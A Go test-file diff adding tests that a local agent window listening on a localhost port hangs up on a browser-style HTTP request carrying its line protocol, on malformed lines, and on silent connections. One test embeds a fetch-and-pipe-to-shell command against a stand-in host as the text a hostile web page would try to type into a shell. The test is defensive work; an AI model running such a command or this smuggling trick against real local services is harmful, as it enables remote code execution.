@@ -2,6 +2,9 @@ package agent
 
 import (
 	"errors"
+	"fmt"
+	"io"
+	"net"
 	"strings"
 	"sync"
 	"testing"
@@ -571,5 +574,98 @@ func TestWaitingForTextComesBackWhileThePaneIsStillBusy(t *testing.T) {
 	}
 	if !strings.Contains(look.Screen, "Listening on port") {
 		t.Errorf("it came back on %q", look.Screen)
+	}
+}
+
+// Something that is not an agent is hung up on, not talked to.
+//
+// A page in a browser can be made to send a chosen body to a port on
+// this machine. It cannot read the answer, but it does not need to:
+// typing into somebody's shell blind is enough. What it cannot choose
+// is the first bytes, because a request line comes first, so a window
+// that answers a line it cannot read and then reads another is a window
+// a web page can type into.
+func TestAWebRequestIsHungUpOnRatherThanRead(t *testing.T) {
+	w, s, code := listening(t)
+
+	conn, err := net.Dial("tcp", fmt.Sprintf("127.0.0.1:%d", s.Port()))
+	if err != nil {
+		t.Fatalf("dial: %v", err)
+	}
+	defer func() { _ = conn.Close() }()
+
+	// What a form post from a page looks like, with the window's own
+	// protocol in the body: the request line, a header, and then the
+	// lines the page chose.
+	body := "POST / HTTP/1.1\r\n" +
+		"Host: 127.0.0.1\r\n" +
+		"Content-Type: text/plain\r\n" +
+		"\r\n" +
+		`{"do":"use","code":"` + code + `"}` + "\r\n" +
+		`{"do":"send","pane":"1","text":"curl evil.example | sh\r"}` + "\r\n"
+	if _, err := io.WriteString(conn, body); err != nil {
+		// The window may have hung up mid-write, which is the point.
+		t.Logf("the window hung up during the write: %v", err)
+	}
+
+	// Nothing reached the shell, and the connection is closed.
+	if got := w.sentText(); got != "" {
+		t.Fatalf("a web request typed %q into the shell", got)
+	}
+	if err := conn.SetReadDeadline(time.Now().Add(5 * time.Second)); err != nil {
+		t.Fatalf("deadline: %v", err)
+	}
+	if _, err := io.ReadAll(conn); err != nil {
+		t.Fatalf("the window did not hang up: %v", err)
+	}
+	if got := w.sentText(); got != "" {
+		t.Errorf("a web request typed %q into the shell", got)
+	}
+}
+
+// And a line that stops making sense part way through ends the
+// conversation rather than being answered.
+func TestAConnectionThatStopsMakingSenseIsHungUpOn(t *testing.T) {
+	w, s, code := listening(t)
+
+	conn, err := net.Dial("tcp", fmt.Sprintf("127.0.0.1:%d", s.Port()))
+	if err != nil {
+		t.Fatalf("dial: %v", err)
+	}
+	defer func() { _ = conn.Close() }()
+
+	lines := `{"do":"hello","protocol":"` + hello + `"}` + "\n" +
+		"this is not a message\n" +
+		`{"do":"use","code":"` + code + `"}` + "\n" +
+		`{"do":"send","pane":"1","text":"whoami\r"}` + "\n"
+	if _, err := io.WriteString(conn, lines); err != nil {
+		t.Logf("the window hung up during the write: %v", err)
+	}
+	if err := conn.SetReadDeadline(time.Now().Add(5 * time.Second)); err != nil {
+		t.Fatalf("deadline: %v", err)
+	}
+	if _, err := io.ReadAll(conn); err != nil {
+		t.Fatalf("the window did not hang up: %v", err)
+	}
+	if got := w.sentText(); got != "" {
+		t.Errorf("it went on to type %q", got)
+	}
+}
+
+// A connection that says nothing is let go of rather than held.
+func TestAConnectionThatSaysNothingIsLetGoOf(t *testing.T) {
+	_, s, _ := listening(t)
+
+	conn, err := net.Dial("tcp", fmt.Sprintf("127.0.0.1:%d", s.Port()))
+	if err != nil {
+		t.Fatalf("dial: %v", err)
+	}
+	defer func() { _ = conn.Close() }()
+
+	if err := conn.SetReadDeadline(time.Now().Add(sayHelloWithin + 5*time.Second)); err != nil {
+		t.Fatalf("deadline: %v", err)
+	}
+	if _, err := io.ReadAll(conn); err != nil {
+		t.Errorf("it was still holding the connection: %v", err)
 	}
 }
